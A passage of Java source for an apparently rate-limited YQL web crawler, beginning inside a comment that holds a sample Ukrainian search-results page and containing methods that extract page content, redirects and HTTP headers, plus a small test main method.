<strong>triacneal</strong>\n                   soin-skin care, \n              \n                  <strong>TRIACNÉAL</strong>\n                  . Рекомендуем также к просмотру: Где же ты раньше был?\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">vakonivka.in.ua  · 28 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=28', this)\" target=\"_blank\">\n                Интернет магазин подарков, подарки Киев, сувениры и подарки \n          \n                <strong>купить</strong>\n                 - Компания E.V.S.\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  Оптовая \n              \n                  <strong>продажа</strong>\n                   подарков и сувениров. \n              \n                  <strong>Покупать</strong>\n                   подарки в нашей стране принято в основном перед торжеством и в одном экземпляре.\n                </span>\n                \n              \n                <br/>\n                \n              \n                <span>\n                  Именно в таком случае для Вашего магазина сувенирной продукции будет кстати компания в которой сувениры оптом в \n              \n                  <strong>Украине</strong>\n                   и подарочная...\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">darunok.com  · 26 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=29', this)\" target=\"_blank\">\n                Крем \n          \n                <strong>avene</strong>\n                 \n          \n                <strong>triacneal</strong>\n                 киев\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  расширенный поиск в найденном только на \n              \n                  <strong>украинских</strong>\n                   сайтах в Киеве. \n              \n                  <strong>Avene</strong>\n                   \n              \n                  <strong>Triacneal</strong>\n                   - \n              \n                  <strong>Авен</strong>\n                   Триакнель.\n                </span>\n                \n              \n                <br/>\n                \n              \n                <span>\n                  \n              \n                  <strong>Купить</strong>\n                   Дермазин крем (Lek) в Аптеке 37. Доставка Дермазин крем по Киеву и \n              \n                  <strong>Украине</strong>\n                  . \n              \n                  <strong>Avene</strong>\n                   (\n              \n                  <strong>Авен</strong>\n                  ). Brelil (Брелил).\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">www.arendane.ru  · 23 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n        \n          <li>\n            \n          \n            <div class=\"title\">\n              \n          \n              <a href=\"#\" onmousedown=\"r('xmlsrch/clid=1324/reqid=1369334910760964-1018490961629605863840191-ws38-688-XML-p2/resnum=30', this)\" target=\"_blank\">\n                Аптека 37 - \n          \n                <strong>Avene</strong>\n                 (\n          \n                <strong>Авен</strong>\n                ) :: Поиск :: \n          \n                <strong>Купить</strong>\n              </a>\n            </div>\n            \n          \n            <div class=\"text\">\n              \n            \n              <span>\n                \n              \n                <span>\n                  Поиск в разделе '\n              \n                  <strong>Avene</strong>\n                   (\n              \n                  <strong>Авен</strong>\n                  )'. Цена, инструкция по применению.\n                </span>\n                \n              \n                <br/>\n                \n              \n                <span>\n                  \n              \n                  <strong>Продажа</strong>\n                   лекарств в аптеке осуществляется только после оформления заказа через сайт или по телефону.\n                </span>\n                \n            \n              </span>\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n          \n            <div class=\"info\">\n              \n            \n              <span style=\"color:#060;\">www.37.com.ua  · 131 КБ</span>\n              \n          \n            </div>\n            \n          \n            <div>\n              \n            \n              <a href=\"#\">Сохраненная копия</a>\n              \n          \n            </div>\n            \n        \n          </li>\n          \n      \n        </ol>\n        \n    \n      </div>\n      \n    \n      <div class=\"nums\">\n        \n      \n        <strong>Страницы</strong>\n        \n      \n        <span class=\"arr\">\n          \n      \n          <span>\n            \n        \n            <span>←</span>\n            \n      \n          </span>\n           \n      \n          <a href=\"#\" id=\"previous_page\">предыдущая</a>\n        </span>\n        \n      \n        <span class=\"arr\">\n          \n      \n          <a href=\"#\" id=\"next_page\">следующая</a>\n           \n        </span>\n        \n      \n        <span>→</span>\n        \n      \n        <div class=\"numbers\" id=\"pager\">\n          \n        \n          <a href=\"#\">1</a>\n          \n        \n          <a href=\"#\">2</a>\n          \n        \n          <span class=\"active\">3</span>\n          \n        \n          <a href=\"#\">4</a>\n          \n        \n          <a href=\"#\">5</a>\n          \n        \n          <a href=\"#\">6</a>\n          \n        \n          <a href=\"#\">7</a>\n          \n        \n          <a href=\"#\">8</a>\n          \n        \n          <a href=\"#\">9</a>\n          \n        \n          <a href=\"#\">10</a>\n          \n        \n          <a href=\"#\">11</a>\n          \n        \n          <a href=\"#\">12</a>\n          \n        \n          <a href=\"#\">13</a>\n          \n      \n        </div>\n        \n      \n        <div class=\"sort\">\n          \n        \n          <p>\n            Отсортировано \n        \n            <span class=\"active\">по релевантности</span>\n             \n        \n            <a href=\"#\">по дате</a>\n          </p>\n          \n      \n        </div>\n        \n    \n      </div>\n      \n    \n      <div class=\"moreInfo\">\n        \n      \n        <span>\n          «\n      \n          <strong>Купить украине avene triacneal</strong>\n          »\n        </span>\n        \n      \n        <br/>\n        \n      \n        <div>\n          \n        \n          <p>\n            в других поисковых системах:\n        \n            <a href=\"#\" onclick=\"AddSearch(3);return false;\" target=\"_blank\">Google</a>\n             ·\n        \n            <a href=\"#\" onclick=\"\" target=\"_blank\">MSN</a>\n             ·\n        \n            <a href=\"#\" onclick=\"AddSearch(4);return false;\" target=\"_blank\">Yahoo!</a>\n             ·\n        \n            <a href=\"#\" onclick=\"AddSearch(2);return false;\" target=\"_blank\">Rambler</a>\n          </p>\n          \n      \n        </div>\n        \n      \n        <form action=\"#\" enctype=\"application/x-www-form-urlencoded\" method=\"post\" name=\"addform\" target=\"_blank\">\n          \n        \n          <input name=\"engine\" type=\"hidden\" value=\"\"/>\n          \n        \n          <input class=\"utf-8\" name=\"ie\" type=\"hidden\"/>\n          \n        \n          <input class=\"utf-8\" name=\"oe\" type=\"hidden\"/>\n          \n        \n          <input id=\"search_no_js\" name=\"no_js\" type=\"hidden\" value=\"1\"/>\n          \n        \n          <input class=\"query\" id=\"q\" name=\"q\" type=\"hidden\" value=\"Купить украине avene triacneal\"/>\n          \n      \n        </form>\n        \n    \n      </div>\n      \n    \n      <br class=\"dump\" clear=\"all\"/>\n      \n    \n      <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"footer\" width=\"100%\">\n        \n      \n        <tr valign=\"top\">\n          \n        \n          <td width=\"25%\">\n            \n          \n            <div class=\"copyLnk\">\n              \n            \n              <br/>\n              \n          \n            </div>\n            \n        \n          </td>\n          \n        \n          <td width=\"50%\">\n            \n          \n            <div class=\"copyright\" style=\"text-align:center;\">\n              \n          \n              <a href=\"#\">Помощь</a>\n               \n          \n              <a href=\"#\" style=\"margin-left:2em;\">Контактные данные</a>\n               \n          \n              <a href=\"#\" style=\"margin-left:2em;\">Реклама на портале ukr.net</a>\n            </div>\n            \n        \n          </td>\n          \n        \n          <td width=\"25%\">\n            \n          \n            <div class=\"copyright\" style=\"padding-left:0\">\n              \n            \n              <p>\n                Copyright \n            \n                <span>© 1998&#151;2013</span>\n                 ООО «\n            \n                <a href=\"#\">Укрнет</a>\n                »\n            \n                <br/>\n                Реализовано в партнерстве с «\n            \n                <a class=\"ya\" href=\"#\" target=\"_blank\">\n                  Я\n            \n                  <span>ндекс</span>\n                </a>\n                »\n              </p>\n              \n          \n            </div>\n            \n        \n          </td>\n          \n      \n        </tr>\n        \n    \n      </table>\n      \n    \n      <br/>\n      \n  \n    </div>\n  </body>\n  \n\n</html>"
		// }
		if(resultItem==null || !resultItem.containsField("url") || !resultItem.containsField("content") ) {
			return false;
		}

		contentSink.put((String) resultItem.get("url"), (String) resultItem.get("content"));
		
		return true;
	}
	private boolean extractRedirects(DBObject resultItem, Map<String, String> redirectSink) {
		if(resultItem.containsField("url") && resultItem.containsField("redirect")) {
			// typical format of redirect headers:
			// { "redirect" : 
			//   [ 
			//     {
			//       "from" : "http://www.schoener-fernsehen.com" , 
			//       "to" : "http://schoener-fernsehen.com/"
			//     } , 
			//     { 
			//       "from" : "http://schoener-fernsehen.com/" , 
			//       "to" : "http://schoener-fernsehen.com/"
			//     } 
			//   ] , 
			//   "url" : "http://schoener-fernsehen.com/" , 
			//   "status" : "200" , 
			//   "headers" : 
			//     { 
			//       "result" : 
			//         { 
			//           "server" : "YTS/1.19.11" , 
			//           "date" : "Wed, 25 Sep 2013 16:45:47 GMT" , 
			//           "content-type" : "text/html" , 
			//           "vary" : "Accept-Encoding" , 
			//           "x-powered-by" : "PHP/5.3.10-1ubuntu3.8" , 
			//           "content-encoding" : "gzip" , 
			//           "age" : "2" , 
			//           "transfer-encoding" : "chunked" , 
			//           "proxy-connection" : "keep-alive"
			//         }
			//     } , 
			//   "content" : "<html xmlns=\"http://www..."
			// }
			final String contentUrl = (String) resultItem.get("url");
			
			
			if(contentUrl!=null && !contentUrl.isEmpty() && resultItem.get("redirect")!=null) {
				List<?> redirects;
				if (resultItem.get("redirect") instanceof List) {
					redirects = (List<?>) resultItem.get("redirect");
				} else {
					// in case of only one value:
					redirects = Arrays.asList(resultItem.get("redirect"));
				}
				// update redirect sink --> use url as final redirect goal (do not track all intermediate steps)
				for(int i=0;i<redirects.size();i++) {
					if(redirects.get(i)!=null && redirects.get(i) instanceof DBObject) {
						final DBObject redirect = (DBObject) redirects.get(i);
						if(redirect.containsField("from")) {
							redirectSink.put((String) redirect.get("from"), contentUrl);
						}
					}
				}
				return true;
			}
		}
		return false;
	}
	
	private Map<String,String> extractHeader(DBObject resultItem, Map<String, Map<String,String>> headerMap) {
		// typical format of the api:
		//	 {
		//	    "redirect": {
		//	     "from": "http://www.amazon.com/dp/B00F67BBLO",
		//	     "to": "http://www.amazon.com/New-Jersey-Suzanne-D-Williams-ebook/dp/B00F67BBLO"
		//	    },
		//	    "url": "http://www.amazon.com/New-Jersey-Suzanne-D-Williams-ebook/dp/B00F67BBLO",
		//	    "status": "200",
		//	    "headers": {
		//	     "result": {
		//	      "date": "Wed, 30 Oct 2013 19:05:45 GMT",
		//	      "server": "ATS/4.0.1",
		//	      "pragma": "no-cache",
		//	      "x-amz-id-1": "1WF4G9A3XSMGVWN0MTM0",
		//	      "p3p": "policyref=\"http://www.amazon.com/w3c/p3p.xml\",CP=\"CAO DSP LAW CUR ADM IVAo IVDo CONo OTPo OUR DELi PUBi OTRi BUS PHY ONL UNI PUR FIN COM NAV INT DEM CNT STA HEA PRE LOC GOV OTC \"",
		//	      "cache-control": "no-cache",
		//	      "x-frame-options": "SAMEORIGIN",
		//	      "expires": "-1",
		//	      "x-amz-id-2": "k4zBu9KoyTyoO74h4z44Hgcio17fG+QcjJdXYifliaA4nsFJ5z10YPXp/EJPmFOL",
		//	      "vary": "Accept-Encoding,User-Agent",
		//	      "content-encoding": "gzip",
		//	      "content-type": "text/html; charset=ISO-8859-1",
		//	      "age": "1",
		//	      "transfer-encoding": "chunked",
		//	      "proxy-connection": "keep-alive"
		//	     }
		//	    },
		//	    "content": "<html>\n<head>\n<script... </html>"
		//	   }
		HashMap<String, String> header = new HashMap<>();
		if(resultItem.containsField("url")) {
			if(resultItem.containsField("headers") && resultItem.get("headers")!=null && resultItem.get("headers") instanceof DBObject) {
				DBObject headerInfo = (DBObject) resultItem.get("headers");
				for(String headerKey : headerInfo.keySet()) {
					if(headerInfo.get(headerKey)!=null && headerInfo.get(headerKey) instanceof String) {
						header.put(headerKey, (String)headerInfo.get("headerInfo"));
					}
				}
			}
			if(resultItem.containsField("status") && resultItem.get("status")!=null && resultItem.get("status") instanceof String) {
				header.put("status", (String) resultItem.get("status"));
			}
			if(header.size()>0) {
				headerMap.put((String) resultItem.get("url"), header);
			}
		}
		return header;
	}
	
	public static void main(String[] args) {
		final YQLAccessRateLimitGuard guard = YQLAccessRateLimitGuard.getInstance();
		final YQLCrawler crawler = new YQLCrawler();
		
		RateLimitedTask task = new RateLimitedTask() {
			
			int i=3;
			@Override
			public void run() {
				CrawlingResults results;
				try {
					results = crawler.crawl(Arrays.asList("http://bit.ly/13M0qc8","http://ow.ly/nf5Hv", "http://kbstroy.ru/img/mim.php?p=kdw36dfsi1"));
				} catch (Exception e) {
					e.printStackTrace();
					return;
				}
				for(String url : results.urls()) {
					System.out.println("redirects:");

					if(results.redirect(url)!=null) {
						System.out.print(url);
						System.out.print(" --> ");
						System.out.println(results.redirect(url));
					}
				}
				
				for(String url : results.urls()) {
					if(results.header(url)!=null) {
						System.out.print(url);
						System.out.print(" --> header: ");
						System.out.println(results.header(url));
					}
					
					if(results.content(url)!=null) {
						if(results.header(url)==null) System.out.println(url);
						System.out.print(" --> ");
						System.out.println(ContentExtractor.CanolaExtractor.extractText(results.content(url)));
					}
				}
			}
			
			@Override
			public boolean repeat() {
				if(0>=--i) {
					guard.close();
					crawler.close();
					return false;
				}
				return true;
			}
		};
		guard.add(task);
	}
	
	@Override
	public void close() {
		api.close();
	}
}
